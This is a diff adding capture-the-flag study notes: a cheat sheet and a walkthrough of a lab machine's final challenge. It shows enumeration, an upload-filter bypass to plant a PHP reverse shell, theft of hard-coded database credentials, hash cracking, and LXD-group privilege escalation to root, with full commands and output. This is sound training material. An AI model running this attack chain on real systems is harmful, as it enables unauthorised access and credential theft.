@@ -478,3 +478,208 @@ Challenge
 Challenge
 * Decode a base64 encoded string, search for Ransomware encrypted files, review Task Scheduler to gain more information on the infection, review the VSS scheduled task and find the volume ID, assign a drive letter to a partition and find a hidden folder, restore a backup from version history
 
+# Task 26 - Day 24 - Final Challenge
+* Client-side filters
+  * Use Burp Suite to intercept JavaScript
+* Shell upgrade and stabilization
+  * python3 -c 'import pty;pty.spawn("/bin/bash")'
+  * export TERM=xterm
+  * ctrl+z, stty raw -echo; fg
+  * ctrl+c
+* MySQL client
+  * mysql
+    * -u username
+    * -p 
+    * show databases;
+    * use databasename;
+    * show tables;
+    * select * from users;
+  * Hash Cracking resources
+    * https://crackstation.net/
+    * https://md5decrypt.net/en/
+    * https://hashes.com/en/decrypt/hash
+  * LXD privilege escalation
+    * id - look for lxd group
+    * lxc image list
+    * lxc init imagename containername -c security.privileged=true
+    * lxc config device add containername devicename disk source=/ path=/mnt/root recursive=true
+    * lxc start containername
+    * lxc exec containername /bin/sh
+    * id
+    * cd /mnt/root/root
+    * https://www.hackingarticles.in/lxd-privilege-escalation/
+
+Final Challenge
+
+* Enumeration - nmap
+```
+nmap -A -T4 10.10.243.81 | tee nmap.txt
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 19:15 EDT
+Nmap scan report for 10.10.243.81
+Host is up (0.22s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Light Cycle
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.61 seconds
+```
+* Enumeration - gobuster
+```
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.243.81:65000 -t 40 -x php
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.243.81:65000
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2021/05/18 19:18:10 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 280]
+/.htpasswd.php        (Status: 403) [Size: 280]
+/.htaccess.php        (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/api                  (Status: 301) [Size: 319] [--> http://10.10.243.81:65000/api/]
+/assets               (Status: 301) [Size: 322] [--> http://10.10.243.81:65000/assets/]
+/grid                 (Status: 301) [Size: 320] [--> http://10.10.243.81:65000/grid/]  
+/index.php            (Status: 200) [Size: 800]                                        
+/server-status        (Status: 403) [Size: 280]                                        
+/uploads.php          (Status: 200) [Size: 1328]                                       
+                                                                                       
+===============================================================
+2021/05/18 19:22:00 Finished
+===============================================================
+```
+* Gaining Access - Uploads
+```
+Examined the uploads.php page and found a JavaScript filter preventing file upload.  Load Burp and modified option filter to intercept JavaScript.  Reloaded uploads.php page and dropped the filter.js.  Uploaded a test image to confirm file placement.  Directory for uploads was found earlier with gobuster, grid.  Modified standard PHP reverse shell with my local VPN info, uploaded file via uploads.php, spun up a local listener with nc, and then browsed the uploaded reverse shell to create a connection.  Grab web flag in /var/www.
+```
+* Shell upgrade
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@light-cycle:/var/www$ export TERM=xterm
+export TERM=xterm
+www-data@light-cycle:/var/www$ ^Z
+[1]+  Stopped                 nc -nvlp 5544
+$ stty raw -echo; fg
+nc -nvlp 5544
+
+www-data@light-cycle:/var/www$ 
+```
+* Loot
+```
+Search /var/www for configuration files.  Found hard coded DB creds in the dbauth.php file.
+```
+* Gaining Access - MySQL
+```
+www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4
+Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| tron               |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use tron;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++----------------+
+| Tables_in_tron |
++----------------+
+| users          |
++----------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | flynn    | [removed] |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)
+```
+* Cracking
+```
+Use https://crackstation.net/ to crack the MD5 hash of the user in the users table of the tron DB.
+```
+* Privilege Escalation - su with cracked creds
+```
+Use the cracked creds to login as the user you found in the DB and grab the user flag
+
+www-data@light-cycle:/var/www/TheGrid/includes$ su flynn
+Password: 
+flynn@light-cycle:/var/www/TheGrid/includes$ 
+```
+* Privilege Escalation - root
+```
+Abuse the user's groups to escalate to root
+
+flynn@light-cycle:~$ id                                                                                                  
+uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)                                                              
+
+flynn@light-cycle:~$ lxc image list
+To start your first container, try: lxc launch ubuntu:18.04                                                              
+                                                                                                                         
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+      
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |                                                                          
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+      
+| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |                                                                          
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+      
+
+flynn@light-cycle:~$ lxc init Alpine breakit -c security.privileged=true
+Creating breakit                                                                                                         
+
+flynn@light-cycle:~$ lxc config device add breakit go disk source=/ path=/mnt/root recursive=true
+Device go added to breakit  
+
+flynn@light-cycle:~$ lxc start breakit           
+
+flynn@light-cycle:~$ lxc list
++---------+---------+----------------------+----------------------------------------------+------------+-----------+
+|  NAME   |  STATE  |         IPV4         |                     IPV6                     |    TYPE    | SNAPSHOTS |
++---------+---------+----------------------+----------------------------------------------+------------+-----------+
+| breakit | RUNNING | 10.237.59.101 (eth0) | fd42:b037:1b43:2a7c:216:3eff:feff:c93 (eth0) | PERSISTENT | 0         |
++---------+---------+----------------------+----------------------------------------------+------------+-----------+
+
+flynn@light-cycle:~$ lxc exec breakit /bin/sh
+
+~ # whoami
+root
+~ # id
+uid=0(root) gid=0(root)
+~ # cd /mnt/root/root
+```
